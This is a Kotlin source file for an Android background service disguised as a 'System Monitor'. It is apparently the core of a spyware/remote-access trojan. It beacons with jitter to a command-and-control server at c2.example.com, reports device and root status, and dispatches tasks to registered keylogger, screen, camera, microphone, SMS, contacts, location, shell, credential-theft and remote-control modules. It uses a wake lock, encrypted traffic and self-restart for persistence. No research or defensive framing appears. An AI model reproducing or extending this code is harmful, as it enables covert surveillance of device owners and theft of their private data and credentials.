package com.system.monitor

import android.accessibilityservice.AccessibilityService
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Binder
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.telephony.SmsMessage
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.system.monitor.capabilities.*
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.nio.ByteBuffer
import java.nio.charset.StandardCharsets
import java.security.KeyFactory
import java.security.KeyPairGenerator
import java.security.MessageDigest
import java.security.SecureRandom
import java.security.spec.PKCS8EncodedKeySpec
import java.security.spec.X509EncodedKeySpec
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread

const val DEFAULT_C2_SERVER = "https://c2.example.com/api"
const val BEACON_INTERVAL = 30000L
const val JITTER_PERCENT = 0.2
const val PREFS_NAME = "agent_config"
const val KEY_C2_SERVER = "c2_server"
const val KEY_PERSISTENT = "persistent_mode"

class AgentService : Service() {

    private val binder = LocalBinder()
    private var running = false
    private var agentId: String? = null
    private var aesKey: SecretKey? = null
    private var rsaPublicKey: java.security.PublicKey? = null
    private val gson = Gson()
    private val capabilities = mutableMapOf<String, Capability>()
    private var wakeLock: PowerManager.WakeLock? = null
    private var mediaRecorder: MediaRecorder? = null
    private var cameraManager: CameraManager? = null
    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val latestFrame = java.util.concurrent.atomic.AtomicReference<ByteArray>()
    private val streaming = java.util.concurrent.atomic.AtomicBoolean(false)
    private var streamExecutor: java.util.concurrent.ScheduledExecutorService? = null
    private var frameRate = 15
    private var quality = 70
    private var scale = 1.0f
    private var remoteAccessibilityService: RemoteAccessibilityService? = null
    private var persistentMode = true

    inner class LocalBinder : Binder() {
        fun getService(): AgentService = this@AgentService
    }

    override fun onCreate() {
        super.onCreate()
        loadConfig()
        acquireWakeLock()
        initCrypto()
        registerCapabilities()
        running = true
        createNotificationChannel()
        startForeground(1, buildForegroundNotification())
        thread(name = "agent-beacon") { beaconLoop() }
        Log.d("AgentService", "Service created, persistentMode=$persistentMode")
    }

    private fun loadConfig() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        persistentMode = prefs.getBoolean(KEY_PERSISTENT, true)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("agent_service", "System Monitor", NotificationManager.IMPORTANCE_LOW).apply {
                description = "System monitoring service"
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        return NotificationCompat.Builder(this, "agent_service")
            .setContentTitle("System Monitor")
            .setContentText("Monitoring active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build()
    }

    private fun getC2Server(): String {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        return prefs.getString(KEY_C2_SERVER, DEFAULT_C2_SERVER) ?: DEFAULT_C2_SERVER
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AgentService::wakelock")
        wakeLock?.acquire()
    }

    private fun initCrypto() {
        val keyGen = KeyPairGenerator.getInstance("RSA")
        keyGen.initialize(2048)
        val keyPair = keyGen.generateKeyPair()
        val prefs = getSharedPreferences("agent_keys", MODE_PRIVATE)
        prefs.edit()
            .putString("private_key", Base64.encodeToString(keyPair.private.encoded, Base64.NO_WRAP))
            .putString("public_key", Base64.encodeToString(keyPair.public.encoded, Base64.NO_WRAP))
            .apply()
        rsaPublicKey = keyPair.public

        val aesGen = KeyGenerator.getInstance("AES")
        aesGen.init(256)
        aesKey = aesGen.generateKey()
    }

    private fun registerCapabilities() {
        capabilities["keylogger"] = KeyloggerCapability(this)
        capabilities["screen"] = ScreenCapability(this)
        capabilities["audio"] = AudioCapability(this)
        capabilities["camera"] = CameraCapability(this)
        capabilities["location"] = LocationCapability(this)
        capabilities["contacts"] = ContactsCapability(this)
        capabilities["sms"] = SmsCapability(this)
        capabilities["call_logs"] = CallLogsCapability(this)
        capabilities["files"] = FilesCapability(this)
        capabilities["apps"] = AppsCapability(this)
        capabilities["wifi"] = WifiCapability(this)
        capabilities["shell"] = ShellCapability(this)
        capabilities["creds"] = CredsCapability(this)
        capabilities["clipboard"] = ClipboardCapability(this)
        capabilities["notifications"] = NotificationsCapability(this)
        capabilities["remote_control"] = RemoteControlCapability(this)
    }

    private fun beaconLoop() {
        while (running) {
            try {
                beacon()
            } catch (e: Exception) {
                Log.e("Agent", "Beacon error", e)
            }
            val jitter = (BEACON_INTERVAL * JITTER_PERCENT * (Math.random() * 2 - 1)).toLong()
            Thread.sleep(BEACON_INTERVAL + jitter)
        }
    }

    private fun beacon() {
        if (agentId == null) {
            registerAgent()
            return
        }
        val tasks = fetchTasks()
        tasks.forEach { task ->
            thread(name = "task-${task.id}") { executeTask(task) }
        }
    }

    private fun registerAgent() {
        val payload = mapOf(
            "agent_id" to generateAgentId(),
            "hostname" to Build.MODEL,
            "os" to "android",
            "arch" to System.getProperty("os.arch"),
            "android_version" to Build.VERSION.RELEASE,
            "sdk" to Build.VERSION.SDK_INT.toString(),
            "privileged" to isRooted().toString()
        )
        val resp = post("/register", payload)
        resp?.let { agentId = it["agent_id"] as? String }
    }

    private fun fetchTasks(): List<Task> {
        val payload = mapOf("agent_id" to agentId!!)
        val resp = post("/tasks", payload)
        val tasksJson = resp?.get("tasks")
        return tasksJson?.let { gson.fromJson(gson.toJson(it), Array<Task>::class.java).toList() } ?: emptyList()
    }

    private fun executeTask(task: Task) {
        val capability = capabilities[task.capability] ?: return
        var output: Any? = null
        var error: String? = null
        var status = "completed"
        try {
            output = capability.execute(task.args)
        } catch (e: Exception) {
            error = e.message
            status = "failed"
        }
        sendResult(Result(task.id, agentId!!, output, error, status))
    }

    private fun sendResult(result: Result) {
        post("/results", result)
    }

    private fun post(endpoint: String, payload: Any): Map<String, Any>? {
        val url = URL("${getC2Server()}$endpoint")
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.doOutput = true
        conn.connectTimeout = 15000
        conn.readTimeout = 15000
        conn.setRequestProperty("Content-Type", "application/octet-stream")
        conn.setRequestProperty("X-Agent-ID", agentId ?: "")

        val encrypted = encrypt(gson.toJson(payload).toByteArray(StandardCharsets.UTF_8))
        conn.outputStream.write(encrypted)
        conn.outputStream.flush()

        if (conn.responseCode == 200) {
            val decrypted = decrypt(conn.inputStream.readAllBytes())
            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
            return gson.fromJson(String(decrypted, StandardCharsets.UTF_8), type)
        }
        return null
    }

    private fun encrypt(data: ByteArray): ByteArray {
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val nonce = ByteArray(12)
        SecureRandom().nextBytes(nonce)
        cipher.init(Cipher.ENCRYPT_MODE, aesKey!!, GCMParameterSpec(128, nonce))
        val encrypted = cipher.doFinal(data)
        val encryptedKey = encryptRSA(aesKey!!.encoded)
        return encryptedKey + nonce + encrypted
    }

    private fun decrypt(data: ByteArray): ByteArray {
        val keyLen = 256
        val encryptedKey = data.copyOfRange(0, keyLen)
        val nonce = data.copyOfRange(keyLen, keyLen + 12)
        val ct = data.copyOfRange(keyLen + 12, data.size)
        val aesKeyBytes = decryptRSA(encryptedKey)
        val keySpec = SecretKeySpec(aesKeyBytes, "AES")
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, keySpec, GCMParameterSpec(128, nonce))
        return cipher.doFinal(ct)
    }

    private fun encryptRSA(data: ByteArray): ByteArray {
        val cipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding")
        cipher.init(Cipher.ENCRYPT_MODE, rsaPublicKey!!)
        return cipher.doFinal(data)
    }

    private fun decryptRSA(data: ByteArray): ByteArray {
        val prefs = getSharedPreferences("agent_keys", MODE_PRIVATE)
        val privKeyB64 = prefs.getString("private_key", "")!!
        val keyFactory = KeyFactory.getInstance("RSA")
        val privKey = keyFactory.generatePrivate(PKCS8EncodedKeySpec(Base64.decode(privKeyB64, Base64.NO_WRAP)))
        val cipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding")
        cipher.init(Cipher.DECRYPT_MODE, privKey)
        return cipher.doFinal(data)
    }

    private fun generateAgentId(): String {
        val prefs = getSharedPreferences("agent_keys", MODE_PRIVATE)
        return prefs.getString("agent_id", "") ?: java.util.UUID.randomUUID().toString().also {
            prefs.edit().putString("agent_id", it).apply()
        }
    }

    private fun isRooted(): Boolean {
        return try {
            Runtime.getRuntime().exec("su").waitFor() == 0
        } catch (e: Exception) {
            false
        }
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun onProjectionResult(resultCode: Int, data: Intent?) {
        if (resultCode != android.app.Activity.RESULT_OK || data == null) {
            streaming.set(false)
            return
        }
        val projectionMgr = getSystemService(MediaProjectionManager::class.java)
        projection = projectionMgr.getMediaProjection(resultCode, data)
    }

    override fun onBind(intent: Intent): IBinder = binder

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (persistentMode) {
            return START_STICKY
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        running = false
        wakeLock?.release()
        capabilities.values.forEach { it.cleanup() }
        stopStream()
        // Restart service if persistent mode
        if (persistentMode) {
            val restartIntent = Intent(this, AgentService::class.java)
            startService(restartIntent)
        }
        super.onDestroy()
    }

    private fun stopStream() {
        streaming.set(false)
        streamExecutor?.shutdownNow()
        virtualDisplay?.release()
        imageReader?.close()
        projection?.stop()
        projection = null
    }

    interface Capability {
        fun execute(args: String?): Any
        fun cleanup()
    }

    data class Task(
        val id: String,
        val capability: String,
        val args: String?,
        val timeout: Int,
        val ticketId: String? = null
    )

    data class Result(
        val taskId: String,
        val agentId: String,
        val output: Any?,
        val error: String?,
        val status: String
    )
}